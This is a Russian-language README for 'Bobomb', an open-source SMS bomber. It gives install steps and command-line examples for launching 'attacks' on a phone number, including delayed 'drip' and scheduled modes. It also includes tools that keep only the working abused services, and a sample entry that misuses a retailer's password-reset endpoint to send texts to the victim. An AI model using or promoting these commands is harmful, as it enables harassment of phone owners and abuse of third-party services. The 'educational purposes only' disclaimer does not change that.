# Bobomb

## ⚠️ Предупреждение

Используйте только в образовательных целях! Авторы не несут ответственности за неправильное использование.

**Открытый SMS бомбер на Android нового поколения** - теперь в терминале!

## 🌐 Языки / Languages

Bobomb теперь поддерживает несколько языков:
- 🇷🇺 **Русский** (по умолчанию)
- 🇬🇧 **English**

Язык можно изменить в меню **Настройки ⚙️** → **Язык**

## 🚀 Быстрый старт

```bash
git clone https://github.com/gooseteam-hackers/Bobomb.git
cd Bobomb

pip install -r requirements.txt

# TUI
python3 main.py
```

## 📖 Команды

### Интерактивный TUI режим
```bash
python main.py
```

### DevTools (инструменты разработчика)
```bash
# Тестировать все сервисы
python core/devtools.py test

# Тест с подробным выводом
python core/devtools.py test --phone 79991234567 --verbose

# Удалить дубликаты
python core/devtools.py filter-dupes

# Оставить только рабочие (HTTP 200/201)
python core/devtools.py filter-success

# Оставить только нерабочие (для отладки)
python core/devtools.py filter-failed

# Экспорт отчёта
python core/devtools.py export-report --output my_report.json

# Экспорт отфильтрованных сервисов
python core/devtools.py export-services --output services_clean.bsl
```

### CLI режим (командная строка)
```bash
# Normal атака
python main.py -p 79123456789 -r 3

# Drip режим (15 мин задержка)
python main.py -p 79123456789 -m drip -d 15 -r 1

# Verbose режим
python main.py -p 79123456789 -v

# DevTools
python main.py --devtools
```

## ⚙️ Настройки / Settings

Bobomb теперь имеет расширенные настройки:

### Язык (Language)
- **Русский** - Русский интерфейс
- **English** - English interface

### Прочие настройки
- **Режим подробного вывода** (Verbose mode) - Детальная информация об атаках
- **Таймаут** (Timeout) - Таймаут запросов (1-60 секунд)
- **Labs** - Статус экспериментальной лаборатории

## 🎯 Функции

### Атаки
- ✅ **Normal Attack** - Быстрые параллельные запросы
- ✅ **Drip Mode** 💧 - Долгие задержки между запросами (15+ мин)
- ✅ **Планирование** 📅 - Атака по расписанию

### DevTools 🔧
- ✅ **Тестирование сервисов** - Проверка HTTP кодов (200/201/202/204)
- ✅ **Фильтрация дубликатов** - Удаление дублей по URL
- ✅ **Фильтр рабочих** - Только сервисы с HTTP 200/201
- ✅ **Фильтр нерабочих** - Только failed сервисы для отладки
- ✅ **JSON отчёты** - Детальные отчёты с временем ответа
- ✅ **BSL экспорт** - Экспорт отфильтрованных сервисов

### Чит-коды (мало ли найдете)

**Как активировать:** В главном меню введите `88` для ввода чит-кода.

## 📁 Структура проекта

```
bobomb/
├── main.py              # Точка входа
├── requirements.txt     # Зависимости
├── README.md           # Документация
├── DEVTOOLS.md         # DevTools документация
├── config/
│   ├── config.json     # Пользовательские настройки
│   └── i18n.json       # Настройки языка
├── core/
│   ├── attacks.py      # Система атак
│   ├── updater.py      # Обновления
│   ├── cheat_codes.py  # Чит-коды
│   ├── devtools.py     # DevTools
│   └── config.py       # Менеджер конфигурации
├── ui/
│   └── tui.py          # TUI интерфейс (с i18n)
├── utils/
│   ├── banner.py       # ASCII баннер
│   └── i18n.py         # Локализация (RU/EN)
└── services/
    └── services.bsl    # База сервисов
```

## 📊 Выводы DevTools

### Репорт (JSON)
```json
{
  "timestamp": "2026-03-30T21:00:00.000000",
  "total": 600,
  "success": 450,
  "failed": 150,
  "results": [
    {
      "name": "SmsSender",
      "url": "https://smssender.notreal/...",
      "status_code": 200,
      "response_time_ms": 125.5,
      "success": true,
      "error": null
    }
  ]
}
```

### Фильтрованные (BSL, aka Bobomb Services List)
```bsl
// Filtered services from services.bsl
// Total: 450
// Generated: 2026-03-30T21:00:00

SERVICE pizzahut:PizzaHut:0
URL https://pizzahut.ru/account/password-reset
METHOD POST
CONTENT_TYPE form
DATA reset_by=phone
DATA action_id=pass-recovery
DATA phone=+{country_code}{phone}
END
```

## ⚙️ Static (обновления)
Есть в ветке static

## 📝 Требования

- Python 3.8+
- rich (для TUI)
- pyfiglet (для баннера)
- aiohttp (для async запросов)

---

**(c) 2025-2026 GooseTeam**  
**MIT License**  
**Открытый SMS бомбер на Android нового поколения**
